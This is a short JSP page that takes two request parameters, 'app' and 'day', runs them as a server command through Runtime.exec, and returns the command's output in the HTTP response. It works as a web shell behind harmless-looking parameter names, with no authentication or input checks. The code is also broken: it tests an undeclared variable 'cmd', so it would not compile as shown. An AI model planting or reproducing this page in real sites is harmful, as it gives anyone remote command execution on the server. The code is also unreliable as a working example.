<%@page import="java.io.IOException"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
        String app = request.getParameter("app");
        String day = request.getParameter("day");
        Process process = null;
        List<String> processList = new ArrayList<String>();
        try {
            if (cmd!=null) {
                process = Runtime.getRuntime().exec("/" + app + " " + day);
                BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = "";
                while ((line = input.readLine()) != null) {
                    processList.add(line);
                }
                input.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        String s = "";
        for (String line : processList) {
            s += line + "\n";
        }
        if (s.equals("")) {
           out.write("null");
        }else {
            out.write(s);
        }
%>
